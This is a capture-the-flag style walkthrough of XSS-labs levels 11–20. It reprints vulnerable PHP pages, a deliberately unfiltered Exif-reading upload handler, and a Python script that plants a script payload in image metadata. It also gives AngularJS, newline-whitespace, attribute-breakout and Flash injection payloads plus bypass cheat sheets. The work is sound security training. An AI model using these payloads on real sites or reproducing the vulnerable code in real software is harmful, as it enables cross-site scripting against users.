| **Level**    | **Injection Point (HTTP Header)** | **PHP Receiver Code (Vulnerability Source)** | **Filtering Status**                         | **Core Payload (General)**      |
| ------------ | --------------------------------- | -------------------------------------------- | -------------------------------------------- | ------------------------------- |
| **Level 11** | **Referer**                       | `$_SERVER['HTTP_REFERER']`                   | Filters `<` `>` <br> **Does not filter `"`** | `" onclick=alert(1) type="text` |
| **Level 12** | **User-Agent**                    | `$_SERVER['HTTP_USER_AGENT']`                | Filters `<` `>` <br> **Does not filter `"`** | `" onclick=alert(1) type="text` |
| **Level 13** | **Cookie**                        | `$_COOKIE['user']`                           | Filters `<` `>` <br> **Does not filter `"`** | `" onclick=alert(1) type="text` |



## Level 14

Source Code Presentation

```html
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level15.php?src=1.gif>点我进level15</a></center>
</body>
</html>

```

1.XSS Labs Level 14 is often considered "broken" or "impossible to complete".

2.We can modify it locally to run it. Since I am in a docker environment, I directly went in and modified `level14.php`.

```php
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center>
    <h3>题目说明：此关卡考查 Exif XSS。</h3>
    <p>原题依赖的外部网站已挂，此处模拟了后端读取 Exif 的逻辑。</p>

    <form action="" method="post" enctype="multipart/form-data">
        <label>选择包含恶意 Exif 信息的图片：</label>
        <input type="file" name="file" />
        <input type="submit" value="上传并分析" />
    </form>
</center>

<?php
// 关闭错误显示，避免干扰
ini_set("display_errors", 0);

// 如果有文件上传
if(isset($_FILES["file"])) {
    // 简单的类型检查
    if ((($_FILES["file"]["type"] == "image/jpeg") || ($_FILES["file"]["type"] == "image/pjpeg"))) {

        $filename = $_FILES["file"]["tmp_name"];

        // 【核心考点还原】
        // 使用 exif_read_data 读取元数据
        // 原题的漏洞在于：读取了 Exif 中的 Model (相机型号) 等字段后，未过滤直接 echo
        $exif = @exif_read_data($filename);

        echo "<center><br><h3>图片分析结果：</h3>";

        if($exif && isset($exif['Model'])) {
            // 漏洞点在这里：直接拼接输出，造成 XSS
            echo "相机型号: " . $exif['Model']; 
        } else {
            echo "未读取到相机型号信息 (Model)，请确保图片带有 Exif 数据。";
        }
        echo "</center>";
    }
}
?>

<center>
    <br><br>
    <div>(成功弹窗后，点击下方链接进入下一关)</div>
    <a href="level15.php">点我进level15</a>
</center>
</body>
</html>
```

For convenience, I didn't write other filters. You can add them if you want. The ultimate method is roughly the same as previous levels.

3.Then we might as well construct a `python` script to implement it.

```python
import piexif
from PIL import Image

# 1. 设置 Payload
# 我们要在网页里执行 alert(1)，所以写入 <script>alert(1)</script>
# 注意：写入的位置是 Exif 中的 "Model" (相机型号) 字段
payload = '<script>alert("Level 14 Cracked")</script>'

# 2. 读取原始图片
img_filename = "a.jpg"  # 随便找张jpg图放在同级目录
output_filename = "hack.jpg"

try:
    img = Image.open(img_filename)

    # 3. 构造 Exif 数据
    # Tag 272 对应 Model 属性
    exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}
    exif_dict["0th"][piexif.ImageIFD.Model] = payload.encode('utf-8')

    # 4. 生成字节流并保存
    exif_bytes = piexif.dump(exif_dict)
    img.save(output_filename, exif=exif_bytes)
    print(f"[+] 生成成功: {output_filename}")
    print("[+] Payload 已写入相机型号字段")

except Exception as e:
    print(f"[-] 出错了: {e}")
```

### Exif Injection

1. * Core Concepts
     
     * **What is Exif**: "Hidden notes" (metadata) of an image, containing camera model, shooting time, GPS, etc. Stored in the JPG file header.
     
     * **Injection Principle**: Exif is essentially text. Attackers use tools to modify fields like "Camera Model" into **malicious code** (like XSS Payload).
     
     * **Trigger Condition**: Server-side reads image Exif info (e.g., `exif_read_data()`) and displays it on the page or stores it in database **without filtering**.
   
   * Attack Flow
   
   * **Creation**: Use ExifTool or Python script to write Payload into image fields.
   
   * **Upload**: Upload the "poisoned" image to the target website.
   
   * **Execution**:
     
     * **Stored XSS**: Triggered when user/admin views image details page.
     
     * **SQL Injection**: Triggered when backend stores Exif info into database (less common).

| **Injection Field (Tag Name)** | **Meaning**         | **Rating** | **Reason**                                            |
| ------------------------------ | ------------------- | ---------- | ----------------------------------------------------- |
| **Model**                      | Camera Model        | ⭐⭐⭐⭐⭐      | Most commonly read and displayed, Level 14 test point |
| **Make**                       | Camera Manufacturer | ⭐⭐⭐⭐⭐      | Often displayed together with Model                   |
| **ImageDescription**           | Image Description   | ⭐⭐⭐⭐       | Allows longer characters, suitable for long Payloads  |
| **UserComment**                | User Comment        | ⭐⭐⭐⭐       | Specifically for user writing, large capacity         |
| **Artist**                     | Photographer/Author | ⭐⭐⭐        | Some album programs display author name               |
| **Copyright**                  | Copyright Info      | ⭐⭐⭐        | Usually displayed at page bottom                      |

## Level 15

Source Code Presentation

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>

```

1.The core technology of this level is **AngularJS** frontend inclusion vulnerability.

Of course, looking at the page source makes it obvious.

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<body><span class="ng-include:"></span></body>
```

2.**What is `ng-include`?** This is an AngularJS directive. It acts similarly to PHP's `include`, used to **fetch an external HTML file and display it inside the current tag**. **Original Design Intent**: This level was originally supposed to follow Level 14. The author wanted you to upload an image containing a Payload in Level 14 (e.g., `1.jpg`), then reference it in Level 15 (`?src='1.jpg'`). AngularJS would execute the image as HTML code. But regrettably, Level 14 is broken.

3.However, we can change our approach and start from Level 1. We can construct:

```html
level15.php?src='level1.php?name=<img src=1 onerror=alert(1)>'
```

Why not use `<script>`? Because HTML loaded via `ng-include` in AngularJS generally won't execute direct `<script>` tags unless specially handled, but the `onerror` event of `<img>` tags will definitely trigger.

The reason it works even after passing through `htmlspecialchars()` via `ng-include` is because the browser automatically handles entity encoding `&lt;` restoring it to characters for JS use, or sending it as a URL parameter.

### AngularJS

| **Knowledge Point**     | **Key Directives/Symbols**   | **Function (Normal)**                                                       | **CTF/Security Point (Hacker View)**                                                                                     | **Typical Payload / Scenario**                                                                        |
| ----------------------- | ---------------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| **Startup Directive**   | `ng-app`                     | Defines root element of Angular app, tells framework to start parsing here. | If the page hasn't enabled Angular, you can inject this attribute to force it on for subsequent attacks.                 | `<html ng-app>`                                                                                       |
| **File Inclusion**      | `ng-include`                 | Loads external HTML fragments and compiles execution.                       | **Bypass Local Filters**. Hide XSS Payload in another file or URL, utilizing this directive to "borrow a knife to kill". | `<div ng-include="'level1.php?x=payload'"></div>`                                                     |
| **Template Expression** | `{{ }}`                      | Outputs variables or simple calculation results in HTML.                    | **CSTI (Client-Side Template Injection)**. Use special constructions to bypass sandbox and execute arbitrary JS code.    | `{{constructor.constructor('alert(1)')()}}`                                                           |
| **Event Directives**    | `ng-click`<br>`ng-mouseover` | Binds mouse click, hover, etc. events.                                      | Similar to native `onclick`, but belongs to Angular system, sometimes bypasses filters for standard HTML events.         | `<div ng-mouseover="x=1">`                                                                            |
| **Unsafe HTML**         | `ng-bind-html`               | Binds HTML content to element.                                              | If not used with `$sce` (Strict Contextual Escaping), leads to DOM XSS.                                                  | `<div ng-bind-html="user_input">`                                                                     |
| **Filters**             | `\|`                         | `\|` (Pipe)                                                                 | Format data (like case conversion, sorting).                                                                             | Sometimes used to obfuscate Payload, or in old versions utilize `orderBy` filters for sandbox escape. |
| **No-Execute**          | `ng-non-bindable`            | Tells Angular **NOT** to parse content of this element.                     | **Defense Measure**. If you see this, it means your injection in this area will be ineffective.                          | `<span ng-non-bindable>{{1+1}}</span>`                                                                |

## Level 16

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script"," ",$str);
$str3=str_replace(" "," ",$str2);
$str4=str_replace("/"," ",$str3);
$str5=str_replace("    "," ",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
</body>
</html>


```

1.From source code analysis, we know this level prevents case sensitivity bypass, usage of `script`, and even (space) is translated to `&nbsp`.

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script"," ",$str);
$str3=str_replace(" "," ",$str2);
$str4=str_replace("/"," ",$str3);
$str5=str_replace("    "," ",$str4);
```

Since `<script>` is not allowed, let's use `<img>`, `<svg>`, `<body>`, etc., but what about the spaces in between?

2.HTML parsing is very tolerant. Besides **Space (%20)**, it recognizes other "whitespace characters" as separators. If space is banned, and Tab is banned, we still have:

* **Carriage Return (CR)** -> URL encoded as `%0d`

* **Line Feed (LF)** -> URL encoded as `%0a`

So, our strategy is: **Use `%0a` or `%0d` instead of space to separate tag attributes.**

3.So we can construct the classic `<img>`:

```html
keyword=<img%0asrc=x%0aonerror=alert(1)>
```

Or use other methods from [Tag Escape](#tag-escape).

### Space Bypass Cheat Sheet

| **Character Name**       | **URL Encoding** | **Fate in Level 16** | **Real World Status**  | **Principle Analysis**                                                                                               |
| ------------------------ | ---------------- | -------------------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------- |
| **Space**                | `%20`            | **Killed**           | Cannon Fodder          | Standard space. Because it's standard, it's the first thing WAF cuts. This problem replaces it with empty, unusable. |
| **Tab**                  | `%09`            | **Killed**           | Substitute             | Tab key. Many lazy devs only filter `%20` and forget `%09`, but this author blocked it too.                          |
| **Line Feed (LF)**       | `%0a`            | **✅ Alive (MVP)**    | **Invisible Assassin** | Linux system newline. Browser treats it as space, but PHP code didn't filter it. **This is the solution**.           |
| **Carriage Return (CR)** | `%0d`            | **✅ Alive (MVP)**    | **Backup**             | Windows return first half. Same breed as `%0a`, works for this level too.                                            |
| **Slash**                | `/`              | **Killed**           | **God Like**           | Divine skill. `<img/src=x>` needs no whitespace at all. Sadly blocked here, otherwise this is the sleekest.          |
| **Form Feed (FF)**       | `%0c`            | Luck Dependent       | Psycho                 | Extremely rare character. Only older browsers or specific environments recognize it. Try your luck as a last resort. |
| **Vertical Tab**         | `%0b`            | Luck Dependent       | Psycho #2              | Same as above, dead horse as live doctor option.                                                                     |

## Level 17

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！"); 
}
</script>
<title>欢迎来到level17</title>
</head>
<body>
<h1 align=center>欢迎来到level17</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
<h2 align=center>成功后，<a href=level18.php?arg01=a&arg02=b>点我进入下一关</a></h2>
</body>
</html>
```

1.It tests not Flash vulnerabilities, but a **classic logic of HTML parsing**, so it doesn't matter if Flash is broken.

2.Core Code

```php
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```

Bad news, it's filtered, many things can't be used. Good news, `src=xsf01.swf?...`. **No quotes! No quotes! No quotes!**

In HTML syntax, if an attribute value is not wrapped in quotes, how does the browser know where it ends? **Answer: It ends when it encounters a space.**

3.So we can use `arg02` to construct:

```
level17.php?arg01=a&arg02=b%20onmouseover=alert(1)
```

We fill `arg01` with whatever `a`. In `arg02` we fill: `b onmouseover=alert(1)`

## Level 18

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level19.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level18</title>
</head>
<body>
<h1 align=center>欢迎来到level18</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
</body>
</html>

```

1.No difference from 17, payload same as 17.

```
level18.php?arg01=a&arg02=b%20onmouseover=alert(1)
```

## Level 19

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level20.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level19</title>
</head>
<body>
<h1 align=center>欢迎来到level19</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>


```

1.This level fixed the biggest issue from above: `"`

This level requires Flash injection. But modern browsers can't use Flash, so what to do?

You can use `Ruffle`, a browser extension, very simple (but sometimes the bugs are fixed too well so Flash exploits don't work).

Or find a specialized "Zombie Browser".

2.To parse `xsf03.swf` we must use another tool `JPEXS`. The `sIFR` file is too long so I won't show it (just glossing over it, haven't fully mastered Flash reverse engineering).

This `xsf03.swf` is an old actor. Its ActionScript logic is roughly:

1. * It accepts a parameter named `version`.
   
   * It assigns this parameter directly to the `htmlText` property of a text box.
   
   * Flash's `htmlText` supports limited HTML tags, including the `<a>` tag (hyperlink).

This makes it easy. We just construct an `<a>` tag with `javascript:` pseudo-protocol, pass it to the `version` parameter, and then click the generated link in Flash to trigger JS.

3.We can construct:

```
level19.php?arg01=version&arg02=<a href="javascript:alert(1)">快点我拿flag</a>
```

Here we utilize a rule of browser HTML rendering: **When parsing HTML attribute values (like src, href, value), it automatically performs "HTML Entity Decoding".** So it works even if escaped.

## Level 20

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level21.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level20</title>
</head>
<body>
<h1 align=center>欢迎来到level20</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>


```

1.This `xsf04.swf` is a component called **ZeroClipboard** (early version). Its function is to help webpages implement "Copy to Clipboard". Internally it uses `ExternalInterface.call` to call browser JavaScript functions. Its ActionScript logic is roughly as follows (simplified):

```php
// Get passed id parameter
var id = loaderInfo.parameters.id;
// Call JS, construct code similar to this:
ExternalInterface.call("ZeroClipboard.dispatch", id, "mouseOut", null);
```

Or in the generated JS, it gets spliced into a string: `try { __flash__toXML(ZeroClipboard.dispatch("YOUR_ID")); } catch (e) { ... }`

**Vulnerability Point:** When Flash splices this JS code, it doesn't correctly handle the `id` parameter we passed. If we pass specific characters, we can close the original quotes and brackets and insert our own JS code.

3. We need to do two things:

4. **Parameter Name (`arg01`)**: Must be the predefined parameter name in Flash, here it is `id`.

5. **Parameter Value (`arg02`)**: Needs to close the JS statement constructed by Flash.

**Construct Payload:** Usually the standard payload for this level is `\"))alert(1)//`.

* `\"`: The backslash here is usually to escape possible internal escaping in Flash, or combine with double quotes to close the string.

* `))`: Close the preceding function call brackets.

* `alert(1)`: Execute our code.

* `//`: Comment out the remaining original JS code to prevent syntax errors.

```php
level20.php?arg01=id&arg02=\"))alert(1)//
```

Regrettably, I don't know why I couldn't trigger it. Below is an expert analysis attached:

> [XSS LABS - Level 20 过关思路_xss-lab20-CSDN博客](https://blog.csdn.net/m0_73360524/article/details/141619635)
